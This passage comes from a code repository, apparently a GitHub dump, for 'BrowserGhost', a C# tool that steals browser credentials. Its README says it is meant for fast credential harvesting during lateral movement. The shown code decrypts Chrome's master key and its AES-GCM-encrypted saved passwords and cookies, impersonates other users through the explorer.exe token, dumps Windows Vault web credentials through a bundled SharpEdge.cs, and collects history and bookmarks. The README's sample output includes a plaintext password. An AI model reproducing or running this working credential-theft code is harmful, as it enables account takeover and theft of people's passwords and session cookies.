System.Text.RegularExpressions.Regex(\"\\\"encrypted_key\\\":\\\"(.*?)\\\"\", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));\r\n\r\n            foreach (System.Text.RegularExpressions.Match prof in pattern)\r\n            {\r\n                if (prof.Success)\r\n                    masterKey = Convert.FromBase64String((prof.Groups[1].Value)); //Decode base64\r\n            }\r\n\r\n            //Trim first 5 bytes. Its signature \"DPAPI\"\r\n            byte[] temp = new byte[masterKey.Length - 5];\r\n            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);\r\n\r\n            try\r\n            {\r\n                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);\r\n            }\r\n            catch (Exception ex)\r\n            {\r\n                Console.WriteLine(ex.ToString());\r\n                return null;\r\n            }\r\n        }\r\n\r\n\r\n\r\n        public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)\r\n        {\r\n            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // IV 12 bytes\r\n\r\n            //trim first 3 bytes(signature \"v10\") and take 12 bytes after signature.\r\n            Array.Copy(encryptedData, 3, iv, 0, 12);\r\n\r\n            try\r\n            {\r\n                //encryptedData without IV\r\n                byte[] Buffer = new byte[encryptedData.Length - 15];\r\n                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);\r\n\r\n                byte[] tag = new byte[16]; //AuthTag\r\n                byte[] data = new byte[Buffer.Length - tag.Length]; //Encrypted Data\r\n\r\n                //Last 16 bytes for tag\r\n                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);\r\n\r\n                //encrypted password\r\n                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);\r\n\r\n                AesGcm aesDecryptor = new AesGcm();\r\n                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));\r\n\r\n                return result;\r\n            }\r\n            catch (Exception ex)\r\n            {\r\n                Console.WriteLine(ex.ToString());\r\n                return null;\r\n            }\r\n        }\r\n\r\n        public static bool Chrome_history()\r\n        {\r\n            string chrome_History_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @\"\\Google\\Chrome\\User Data\\Default\\History\";\r\n            if (File.Exists(chrome_History_path) == true)\r\n            {\r\n                \r\n                string cookie_tempFile = Path.GetTempFileName();\r\n                File.Copy(chrome_History_path, cookie_tempFile, true);\r\n\r\n                Console.WriteLine(\"\\t[+] Copy {0} to {1}\", chrome_History_path, cookie_tempFile);\r\n\r\n                SQLiteDatabase database = new SQLiteDatabase(cookie_tempFile);\r\n                string query = \"select url,title from urls\";\r\n                DataTable resultantQuery = database.ExecuteQuery(query);\r\n                foreach (DataRow row in resultantQuery.Rows)\r\n                {\r\n                    string url;\r\n                    string title;\r\n                    try\r\n                    {\r\n                        url = (string)row[\"url\"];\r\n                        title = (string)row[\"title\"];\r\n                    }\r\n                    catch\r\n                    {\r\n                        continue;\r\n\r\n                    }\r\n                    \r\n                    \r\n                    Console.WriteLine(\"\\t{0} \\t {1}\", url, title);\r\n\r\n                }\r\n                database.CloseDatabase();\r\n                System.IO.File.Delete(cookie_tempFile);\r\n                Console.WriteLine(\"\\t[+] Delete File {0}\", cookie_tempFile);\r\n\r\n            }\r\n            else\r\n            {\r\n                Console.WriteLine(\"[-] {0} Not Found!\", chrome_History_path);\r\n            }\r\n\r\n            return true;\r\n        }\r\n\r\n\r\n\r\n        public static bool Chrome_cookies()\r\n        {\r\n            string chrome_cookie_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @\"\\Google\\Chrome\\User Data\\Default\\Cookies\";\r\n            if (File.Exists(chrome_cookie_path) == true)\r\n            {\r\n                string chrome_state_file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @\"\\Google\\Chrome\\User Data\\Local State\";\r\n                string cookie_tempFile = Path.GetTempFileName();\r\n                File.Copy(chrome_cookie_path, cookie_tempFile, true);\r\n\r\n                Console.WriteLine(\"\\t[+] Copy {0} to {1}\", chrome_cookie_path, cookie_tempFile);\r\n\r\n                SQLiteDatabase database = new SQLiteDatabase(cookie_tempFile);\r\n                string query = \"SELECT host_key, name,encrypted_value FROM cookies\";\r\n                DataTable resultantQuery = database.ExecuteQuery(query);\r\n                foreach (DataRow row in resultantQuery.Rows)\r\n                {\r\n                    string host_key = (string)row[\"host_key\"].ToString();\r\n                    string name = (string)row[\"name\"].ToString();\r\n                    byte[] cookieBytes = Convert.FromBase64String((string)row[\"encrypted_value\"].ToString());\r\n                    string cookie_value;\r\n                    try\r\n                    {\r\n                        //老版本解密\r\n                        cookie_value = Encoding.UTF8.GetString(ProtectedData.Unprotect(cookieBytes, null, DataProtectionScope.CurrentUser));\r\n\r\n                        //Console.WriteLine(\"{0} {1} {2}\", originUrl, username, password);\r\n                    }\r\n                    catch (Exception ex) //如果异常了就用新加密方式尝试\r\n                    {\r\n\r\n                        byte[] masterKey = GetMasterKey(chrome_state_file);\r\n                        cookie_value = DecryptWithKey(cookieBytes, masterKey);\r\n\r\n\r\n                    }\r\n                    Console.WriteLine(\"\\t[{0}] \\t {1}={2}\",host_key,name, cookie_value);\r\n                    \r\n                }\r\n                database.CloseDatabase();\r\n                System.IO.File.Delete(cookie_tempFile);\r\n                Console.WriteLine(\"\\t[+] Delete File {0}\", cookie_tempFile);\r\n\r\n            }\r\n            else\r\n            {\r\n                Console.WriteLine(\"[-] {0} Not Found!\", chrome_cookie_path);\r\n            }\r\n\r\n            return true;\r\n        }\r\n\r\n\r\n        //偷个懒 后面再解析json\r\n        public static bool Chrome_books()\r\n        {\r\n            string chrome_book_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @\"\\Google\\Chrome\\User Data\\Default\\Bookmarks\";\r\n            if (File.Exists(chrome_book_path) == true)\r\n            {\r\n\r\n                string booktext = File.ReadAllText(chrome_book_path);\r\n                Console.WriteLine(booktext);\r\n\r\n\r\n            }\r\n            else\r\n            {\r\n                Console.WriteLine(\"[-] {0} Not Found!\", chrome_book_path);\r\n            }\r\n                \r\n            return true;\r\n        }\r\n        public static bool Chrome_logins()\r\n        {\r\n            //copy login data\r\n            string login_data_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @\"\\Google\\Chrome\\User Data\\Default\\Login Data\";\r\n\r\n            if (File.Exists(login_data_path) == true)\r\n            {\r\n                string chrome_state_file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @\"\\Google\\Chrome\\User Data\\Local State\";\r\n                string login_data_tempFile = Path.GetTempFileName();\r\n                File.Copy(login_data_path, login_data_tempFile, true);\r\n\r\n                Console.WriteLine(\"\\t[+] Copy {0} to {1}\", login_data_path, login_data_tempFile);\r\n\r\n                SQLiteDatabase database = new SQLiteDatabase(login_data_tempFile);\r\n                string query = \"SELECT origin_url, username_value, password_value FROM logins\";\r\n                DataTable resultantQuery = database.ExecuteQuery(query);\r\n\r\n                foreach (DataRow row in resultantQuery.Rows)\r\n                {\r\n                    string url;\r\n                    string username;\r\n                    string password;\r\n                    string crypt_password;\r\n                    url = (string)row[\"origin_url\"].ToString();\r\n                    username = (string)row[\"username_value\"].ToString();\r\n                    crypt_password = row[\"password_value\"].ToString();\r\n\r\n\r\n                    byte[] passwordBytes = Convert.FromBase64String(crypt_password);\r\n                    \r\n                    try\r\n                    {\r\n                        //老版本解密\r\n                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser));\r\n\r\n                        //Console.WriteLine(\"{0} {1} {2}\", originUrl, username, password);\r\n                    }\r\n                    catch (Exception ex) //如果异常了就用新加密方式尝试\r\n                    {\r\n\r\n                        byte[] masterKey = GetMasterKey(chrome_state_file);\r\n                        password = DecryptWithKey(passwordBytes, masterKey);\r\n\r\n\r\n                    }\r\n\r\n\r\n                    Console.WriteLine(\"\\t[URL] -> {0}\\n\\t[USERNAME] -> {1}\\n\\t[PASSWORD] -> {2}\\n\", url, username, password);\r\n                    \r\n\r\n                }\r\n                database.CloseDatabase();\r\n                System.IO.File.Delete(login_data_tempFile);\r\n                Console.WriteLine(\"\\t[+] Delete File {0}\", login_data_tempFile);\r\n            }\r\n            else\r\n            {\r\n                Console.WriteLine(\"[-] {0} Not Found!\", login_data_path);\r\n            }\r\n\r\n                \r\n            \r\n            return false;\r\n        }\r\n\r\n        public static bool IE_history()//system 获取history时有点问题 \r\n        {\r\n            string info = \"\";\r\n\r\n            RegistryKey Key;\r\n\r\n            Key = Registry.CurrentUser;\r\n            RegistryKey myreg = Key.OpenSubKey(\"Software\\\\Microsoft\\\\Internet Explorer\\\\TypedURLs\");\r\n            string[] urls = new string[26];\r\n\r\n            for (int i = 1; i < 26; i++)\r\n            {\r\n                try\r\n                {\r\n                    info = myreg.GetValue(\"url\" + i.ToString()).ToString();\r\n                    \r\n                    urls[i] = info;\r\n                }\r\n                catch\r\n                {\r\n                    ;\r\n                }\r\n            }\r\n            foreach (string url in urls)\r\n            {\r\n                if (url != null)\r\n                {\r\n                    Console.WriteLine(\"\\t{0}\", url);\r\n                }\r\n\r\n            }\r\n\r\n          \r\n            return true;\r\n        }\r\n\r\n        public static bool IE_books()\r\n        {\r\n            string book_path = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);\r\n\r\n            string[] files = Directory.GetFiles(book_path, \"*.url\", SearchOption.AllDirectories);\r\n\r\n            foreach (string url_file_path in files)\r\n            {\r\n                if (File.Exists(url_file_path) == true)\r\n                {\r\n\r\n                    string booktext = File.ReadAllText(url_file_path);\r\n\r\n                    Match match = Regex.Match(booktext, @\"URL=(.*?)\\n\");\r\n                    Console.WriteLine(\"\\t\" + url_file_path);\r\n                    Console.WriteLine(\"\\t\\t\" + match.Value);\r\n\r\n                }\r\n            }\r\n\r\n            return true;\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n\r\n\r\n            Console.WriteLine(\"[+] Current user {0}\", Environment.UserName);\r\n\r\n            //先获取 explorer.exe 进程\r\n            foreach (Process p in Process.GetProcesses())\r\n            {\r\n                int pid = p.Id;\r\n                string processname = p.ProcessName;\r\n                string process_of_user = GetProcessUserName(pid);\r\n\r\n                //                Recvtoself\r\n                if (processname == \"explorer\")\r\n                {\r\n\r\n                    Console.WriteLine(\"[*] [{0}] [{1}] [{2}]\", pid, processname, process_of_user);\r\n\r\n                    ImpersonateProcessToken(pid);\r\n                    Console.WriteLine(\"[*] Impersonate user {0}\", Environment.UserName);\r\n                    Console.WriteLine(\"[*] Current user {0}\", Environment.UserName);\r\n\r\n                    Console.WriteLine(\"===============Chrome=============\");\r\n                    //密码\r\n                    Console.WriteLine(\"\\n[*]Get Chrome Login Data\");\r\n                    Chrome_logins();\r\n                    \r\n                    //获取书签\r\n                    Console.WriteLine(\"\\n[*]Get Chrome Bookmarks\");\r\n                    Chrome_books();\r\n\r\n                    //cookie\r\n                    Console.WriteLine(\"\\n[*]Get Chrome Cookie\");\r\n                    Chrome_cookies();\r\n\r\n                    Console.WriteLine(\"\\n[*]Get Chrome History\");\r\n                    Chrome_history();\r\n\r\n                    //-----------------------IE----------------\r\n\r\n                    Console.WriteLine(\"===============IE=============\");\r\n\r\n                    \r\n\r\n                    Console.WriteLine(\"\\n[*]Get IE Books\");\r\n                    IE_books();\r\n\r\n                    Console.WriteLine(\"\\n[*]Get IE Password\");\r\n                    Edge.GetLogins(); //.net2 提取这个密码太复杂了 参考至 https://github.com/djhohnstein/SharpWeb/raw/master/Edge/SharpEdge.cs\r\n\r\n                    Console.WriteLine(\"\\n[*]Get IE History\");\r\n                    IE_history();\r\n                    \r\n                    //回退权限\r\n                    RevertToSelf();\r\n                    Console.WriteLine(\"[*] Recvtoself\");\r\n                    Console.WriteLine(\"[*] Current user {0}\", Environment.UserName);\r\n                    \r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n\r\n    }\r\n}\r\n\r\n"
        },
        {
          "name": "Properties",
          "type": "tree",
          "content": null
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 3.966796875,
          "content": "# BrowserGhost\n\n## 介绍：\n\n这是一个抓取浏览器密码的工具，后续会添加更多功能\n\n## 当前已经完成的功能：\n\n- 实现system抓机器上其他用户的浏览器密码(方便横向移动时快速凭据采集)\n- 用.net2 实现可兼容大部分windows，并去掉依赖(不需要System.Data.SQLite.dll这些累赘)\n- 可以解密chrome全版本密码(chrome80版本后加密方式变了)\n- Chrome已经可以获取login data、cookie、history、book了\n- IE 支持获取书签、密码、history了 (.net2提取密码太复杂了代码参考至`https://github.com/djhohnstein/SharpWeb/raw/master/Edge/SharpEdge.cs`)\n\n\n## 即将去做:\n\n- system权限下获取IE History有点问题\n- 优化输出\n- 监控实时cookie\n- 兼容其他主流浏览器(firefox、360极速浏览器等)\n\n```\nC:\\Users\\Administrator\\Desktop>BrowserGhost.exe\n[+] Current user Administrator\n[*] [4764] [explorer] [Administrator]\n[*] Impersonate user Administrator\n[*] Current user Administrator\n===============Chrome=============\n\n[*]Get Chrome Login Data\n\t[+] Copy C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data to C:\\Users\\Administrator\\AppData\\Local\\Temp\\tmp6B9F.tmp\n\t[URL] -> https://xui.ptlogin2.qq.com/cgi-bin/xlogin\n\t[USERNAME] -> n0thing@gmail.com\n\t[PASSWORD] -> Iloveprettygirls\n\n\t[+] Delete File C:\\Users\\Administrator\\AppData\\Local\\Temp\\tmp6B9F.tmp\n\n[*]Get Chrome Bookmarks\n{\n   \"checksum\": \"eee70b132cc4f9644d01f989e18fdb38\",\n   \"roots\": {\n      \"bookmark_bar\": {\n         \"children\": [ {\n            \"date_added\": \"13236861887917624\",\n            \"guid\": \"c5df2041-d745-4173-af39-b5c48f8d98a2\",\n            \"id\": \"5\",\n            \"name\": \"GitHub\",\n            \"type\": \"url\",\n            \"url\": \"https://github.com/\"\n         } ],\n         \"date_added\": \"13236861618031351\",\n         \"date_modified\": \"13236861887917624\",\n         \"guid\": \"00000000-0000-4000-a000-000000000002\",\n         \"id\": \"1\",\n         \"name\": \"书签栏\",\n         \"type\": \"folder\"\n      },\n      \"other\": {\n         \"children\": [  ],\n         \"date_added\": \"13236861618031378\",\n         \"date_modified\": \"0\",\n         \"guid\": \"00000000-0000-4000-a000-000000000003\",\n         \"id\": \"2\",\n         \"name\": \"其他书签\",\n         \"type\": \"folder\"\n      },\n      \"synced\": {\n         \"children\": [  ],\n         \"date_added\": \"13236861618031381\",\n         \"date_modified\": \"0\",\n         \"guid\": \"00000000-0000-4000-a000-000000000004\",\n         \"id\": \"3\",\n         \"name\": \"移动设备书签\",\n         \"type\": \"folder\"\n      }\n   },\n   \"version\": 1\n}\n\n\n[*]Get Chrome Cookie\n\t[+] Copy C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies to C:\\Users\\Administrator\\AppData\\Local\\Temp\\tmp6D94.tmp\n\t[github.com] \t _device_id=516175fxxxxxxxxx90133c2\n\t[.github.com] \t _octo=GH1.1.3xxxxxxxxx5173\n\t[.google.com] \t NID=204=DEIRBPT8FML_IsHGv1B2xxxxxxxxxxxxxxxxxxxSRlaNRV3-nfhFV8aHAgO6Smtf4JXQqR-W63p0KOVKgVd0VCXv4bKww97DEhc-PI1sVdbD4hGOuVwchN4Bwo-V61AtfjZM\n\t[+] Delete File C:\\Users\\Administrator\\AppData\\Local\\Temp\\tmp6D94.tmp\n\n[*]Get Chrome History\n\t[+] Copy C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History to C:\\Users\\Administrator\\AppData\\Local\\Temp\\tmp6E32.tmp\n\thttp://github.com/ \t The world’s leading software development platform · GitHub\n\thttps://github.com/ \t GitHub\n\thttps://github.com/login \t Sign in to GitHub · GitHub\n\n\t[+] Delete File C:\\Users\\Administrator\\AppData\\Local\\Temp\\tmp6E32.tmp\n===============IE=============\n\n[*]Get IE Books\n\tC:\\Users\\Administrator\\Favorites\\Sign in to GitHub · GitHub.url\n\t\tURL=https://github.com/session\n\n\n[*]Get IE Password\n\tVault Type   : Web Credentials\n\tResource     : https://github.com/\n\tIdentity     : n0thing@gmail.com\n\tCredential   : Iloveprettygirls\n\tLastModified : 2020/6/17 7:08:50\n\n\n[*]Get IE History\n\thttps://github.com/login\n\thttps://github.com/join\n\thttps://github.com/john\n\thttps://github.com/sign\n\thttp://github.com/\n\thttp://go.microsoft.com/fwlink/p/?LinkId=255141\n[*] Recvtoself\n[*] Current user Administrator\n\n\n\n```\n\n![](2.png)\n"
        },
        {
          "name": "SQLite",
          "type": "tree",
          "content": null
        },
        {
          "name": "SharpEdge.cs",
          "type": "blob",
          "size": 15.6025390625,
          "content": "﻿using System;\r\nusing System.Collections.Generic;\r\nusing System.Text;\r\nusing System.Reflection;\r\nusing System.Reflection.Emit;\r\nusing System.IO;\r\nusing System.Runtime.InteropServices;\r\n\r\n/*\r\n * Author: Dwight Hohnstein (@djhohnstein)\r\n * \r\n * This is a C# implementation of Get-VaultCredential\r\n * from @mattifestation, whose PowerShell source is here:\r\n * https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-VaultCredential.ps1\r\n */\r\n\r\nnamespace SharpEdge\r\n{\r\n    // Thanks to @tifkin and @harmj0y for pointing out that\r\n    // Reflection is unecessary for defining these.\r\n    public static class VaultCli\r\n    {\r\n        public enum VAULT_ELEMENT_TYPE : Int32\r\n        {\r\n            Undefined = -1,\r\n            Boolean = 0,\r\n            Short = 1,\r\n            UnsignedShort = 2,\r\n            Int = 3,\r\n            UnsignedInt = 4,\r\n            Double = 5,\r\n            Guid = 6,\r\n            String = 7,\r\n            ByteArray = 8,\r\n            TimeStamp = 9,\r\n            ProtectedArray = 10,\r\n            Attribute = 11,\r\n            Sid = 12,\r\n            Last = 13\r\n        }\r\n\r\n        public enum VAULT_SCHEMA_ELEMENT_ID : Int32\r\n        {\r\n            Illegal = 0,\r\n            Resource = 1,\r\n            Identity = 2,\r\n            Authenticator = 3,\r\n            Tag = 4,\r\n            PackageSid = 5,\r\n            AppStart = 100,\r\n            AppEnd = 10000\r\n        }\r\n\r\n        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]\r\n        public struct VAULT_ITEM_WIN8\r\n        {\r\n            public Guid SchemaId;\r\n            public IntPtr pszCredentialFriendlyName;\r\n            public IntPtr pResourceElement;\r\n            public IntPtr pIdentityElement;\r\n            public IntPtr pAuthenticatorElement;\r\n            public IntPtr pPackageSid;\r\n            public UInt64 LastModified;\r\n            public UInt32 dwFlags;\r\n            public UInt32 dwPropertiesCount;\r\n            public IntPtr pPropertyElements;\r\n        }\r\n\r\n        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]\r\n        public struct VAULT_ITEM_WIN7\r\n        {\r\n            public Guid SchemaId;\r\n            public IntPtr pszCredentialFriendlyName;\r\n            public IntPtr pResourceElement;\r\n            public IntPtr pIdentityElement;\r\n            public IntPtr pAuthenticatorElement;\r\n            public UInt64 LastModified;\r\n            public UInt32 dwFlags;\r\n            public UInt32 dwPropertiesCount;\r\n            public IntPtr pPropertyElements;\r\n        }\r\n\r\n        [StructLayout(LayoutKind.Explicit, CharSet = CharSet.Ansi)]\r\n        public struct VAULT_ITEM_ELEMENT\r\n        {\r\n            [FieldOffset(0)] public VAULT_SCHEMA_ELEMENT_ID SchemaElementId;\r\n            [FieldOffset(8)] public VAULT_ELEMENT_TYPE Type;\r\n        }\r\n\r\n        [DllImport(\"vaultcli.dll\")]\r\n        public extern static Int32 VaultOpenVault(ref Guid vaultGuid, UInt32 offset, ref IntPtr vaultHandle);\r\n\r\n        [DllImport(\"vaultcli.dll\")]\r\n        public extern static Int32 VaultCloseVault(ref IntPtr vaultHandle);\r\n\r\n        [DllImport(\"vaultcli.dll\")]\r\n        public extern static Int32 VaultFree(ref IntPtr vaultHandle);\r\n\r\n        [DllImport(\"vaultcli.dll\")]\r\n        public extern static Int32 VaultEnumerateVaults(Int32 offset, ref Int32 vaultCount, ref IntPtr vaultGuid);\r\n\r\n        [DllImport(\"vaultcli.dll\")]\r\n        public extern static Int32 VaultEnumerateItems(IntPtr vaultHandle, Int32 chunkSize, ref Int32 vaultItemCount, ref IntPtr vaultItem);\r\n\r\n        [DllImport(\"vaultcli.dll\", EntryPoint = \"VaultGetItem\")]\r\n        public extern static Int32 VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, Int32 arg6, ref IntPtr passwordVaultPtr);\r\n\r\n        [DllImport(\"vaultcli.dll\", EntryPoint = \"VaultGetItem\")]\r\n        public extern static Int32 VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, Int32 arg5, ref IntPtr passwordVaultPtr);\r\n\r\n    }\r\n\r\n    public class Edge\r\n    {\r\n        public static void GetLogins()\r\n        {\r\n            //Console.WriteLine(\"\\r\\n\\r\\n=== Checking Windows Vaults ===\\r\\n\");\r\n            var OSVersion = Environment.OSVersion.Version;\r\n            var OSMajor = OSVersion.Major;\r\n            var OSMinor = OSVersion.Minor;\r\n\r\n            Type VAULT_ITEM;\r\n\r\n            if (OSMajor >= 6 && OSMinor >= 2)\r\n            {\r\n                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN8);\r\n            }\r\n            else\r\n            {\r\n                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN7);\r\n            }\r\n\r\n            /* Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct */\r\n            object GetVaultElementValue(IntPtr vaultElementPtr)\r\n            {\r\n                object results;\r\n                object partialElement = System.Runtime.InteropServices.Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));\r\n                FieldInfo partialElementInfo = partialElement.GetType().GetField(\"Type\");\r\n                var partialElementType = partialElementInfo.GetValue(partialElement);\r\n\r\n                IntPtr elementPtr = (IntPtr)(vaultElementPtr.ToInt64() + 16);\r\n                switch ((int)partialElementType)\r\n                {\r\n                    case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!\r\n                        IntPtr StringPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);\r\n                        results = System.Runtime.InteropServices.Marshal.PtrToStringUni(StringPtr);\r\n                        break;\r\n                    case 0: // VAULT_ELEMENT_TYPE == bool\r\n                        results = System.Runtime.InteropServices.Marshal.ReadByte(elementPtr);\r\n                        results = (bool)results;\r\n                        break;\r\n                    case 1: // VAULT_ELEMENT_TYPE == Short\r\n                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);\r\n                        break;\r\n                    case 2: // VAULT_ELEMENT_TYPE == Unsigned Short\r\n                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);\r\n                        break;\r\n                    case 3: // VAULT_ELEMENT_TYPE == Int\r\n                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);\r\n                        break;\r\n                    case 4: // VAULT_ELEMENT_TYPE == Unsigned Int\r\n                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);\r\n                        break;\r\n                    case 5: // VAULT_ELEMENT_TYPE == Double\r\n                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Double));\r\n                        break;\r\n                    case 6: // VAULT_ELEMENT_TYPE == GUID\r\n                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Guid));\r\n                        break;\r\n                    case 12: // VAULT_ELEMENT_TYPE == Sid\r\n                        IntPtr sidPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);\r\n                        var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);\r\n                        results = sidObject.Value;\r\n                        break;\r\n                    default:\r\n                        /* Several VAULT_ELEMENT_TYPES are currently unimplemented according to\r\n                         * Lord Graeber. Thus we do not implement them. */\r\n                        results = null;\r\n                        break;\r\n                }\r\n                return results;\r\n            }\r\n            /* End helper function */\r\n\r\n            Int32 vaultCount = 0;\r\n            IntPtr vaultGuidPtr = IntPtr.Zero;\r\n            var result = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);\r\n\r\n            //var result = CallVaultEnumerateVaults(VaultEnum, 0, ref vaultCount, ref vaultGuidPtr);\r\n\r\n            if ((int)result != 0)\r\n            {\r\n                throw new Exception(\"[ERROR] Unable to enumerate vaults. Error (0x\" + result.ToString() + \")\");\r\n            }\r\n\r\n            // Create dictionary to translate Guids to human readable elements\r\n            IntPtr guidAddress = vaultGuidPtr;\r\n            Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>();\r\n            vaultSchema.Add(new Guid(\"2F1A6504-0641-44CF-8BB5-3612D865F2E5\"), \"Windows Secure Note\");\r\n            vaultSchema.Add(new Guid(\"3CCD5499-87A8-4B10-A215-608888DD3B55\"), \"Windows Web Password Credential\");\r\n            vaultSchema.Add(new Guid(\"154E23D0-C644-4E6F-8CE6-5069272F999F\"), \"Windows Credential Picker Protector\");\r\n            vaultSchema.Add(new Guid(\"4BF4C442-9B8A-41A0-B380-DD4A704DDB28\"), \"Web Credentials\");\r\n            vaultSchema.Add(new Guid(\"77BC582B-F0A6-4E15-4E80-61736B6F3B29\"), \"Windows Credentials\");\r\n            vaultSchema.Add(new Guid(\"E69D7838-91B5-4FC9-89D5-230D4D4CC2BC\"), \"Windows Domain Certificate Credential\");\r\n            vaultSchema.Add(new Guid(\"3E0E35BE-1B77-43E7-B873-AED901B6275B\"), \"Windows Domain Password Credential\");\r\n            vaultSchema.Add(new Guid(\"3C886FF3-2669-4AA2-A8FB-3F6759A77548\"), \"Windows Extended Credential\");\r\n            vaultSchema.Add(new Guid(\"00000000-0000-0000-0000-000000000000\"), null);\r\n\r\n            for (int i = 0; i < vaultCount; i++)\r\n            {\r\n                // Open vault block\r\n                object vaultGuidString = System.Runtime.InteropServices.Marshal.PtrToStructure(guidAddress, typeof(Guid));\r\n                Guid vaultGuid = new Guid(vaultGuidString.ToString());\r\n                guidAddress = (IntPtr)(guidAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(typeof(Guid)));\r\n                IntPtr vaultHandle = IntPtr.Zero;\r\n                string vaultType;\r\n                if (vaultSchema.ContainsKey(vaultGuid))\r\n                {\r\n                    vaultType = vaultSchema[vaultGuid];\r\n                }\r\n                else\r\n                {\r\n                    vaultType = vaultGuid.ToString();\r\n                }\r\n                result = VaultCli.VaultOpenVault(ref vaultGuid, (UInt32)0, ref vaultHandle);\r\n                if (result != 0)\r\n                {\r\n                    throw new Exception(\"Unable to open the following vault: \" + vaultType + \". Error: 0x\" + result.ToString());\r\n                }\r\n                // Vault opened successfully! Continue.\r\n\r\n                // Fetch all items within Vault\r\n                int vaultItemCount = 0;\r\n                IntPtr vaultItemPtr = IntPtr.Zero;\r\n                result = VaultCli.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);\r\n                if (result != 0)\r\n                {\r\n                    throw new Exception(\"[ERROR] Unable to enumerate vault items from the following vault: \" + vaultType + \". Error 0x\" + result.ToString());\r\n                }\r\n                var structAddress = vaultItemPtr;\r\n                if (vaultItemCount > 0)\r\n                {\r\n                    // For each vault item...\r\n                    for (int j = 1; j <= vaultItemCount; j++)\r\n                    {\r\n                        // Begin fetching vault item...\r\n                        var currentItem = System.Runtime.InteropServices.Marshal.PtrToStructure(structAddress, VAULT_ITEM);\r\n                        structAddress = (IntPtr)(structAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(VAULT_ITEM));\r\n\r\n                        IntPtr passwordVaultItem = IntPtr.Zero;\r\n                        // Field Info retrieval\r\n                        FieldInfo schemaIdInfo = currentItem.GetType().GetField(\"SchemaId\");\r\n                        Guid schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString());\r\n                        FieldInfo pResourceElementInfo = currentItem.GetType().GetField(\"pResourceElement\");\r\n                        IntPtr pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem);\r\n                        FieldInfo pIdentityElementInfo = currentItem.GetType().GetField(\"pIdentityElement\");\r\n                        IntPtr pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem);\r\n                        FieldInfo dateTimeInfo = currentItem.GetType().GetField(\"LastModified\");\r\n                        UInt64 lastModified = (UInt64)dateTimeInfo.GetValue(currentItem);\r\n\r\n                        object[] vaultGetItemArgs;\r\n                        IntPtr pPackageSid = IntPtr.Zero;\r\n                        if (OSMajor >= 6 && OSMinor >= 2)\r\n                        {\r\n                            // Newer versions have package sid\r\n                            FieldInfo pPackageSidInfo = currentItem.GetType().GetField(\"pPackageSid\");\r\n                            pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem);\r\n                            result = VaultCli.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);\r\n                        }\r\n                        else\r\n                        {\r\n                            result = VaultCli.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);\r\n                        }\r\n\r\n                        if (result != 0)\r\n                        {\r\n                            throw new Exception(\"Error occured while retrieving vault item. Error: 0x\" + result.ToString());\r\n                        }\r\n                        object passwordItem = System.Runtime.InteropServices.Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);\r\n                        FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField(\"pAuthenticatorElement\");\r\n                        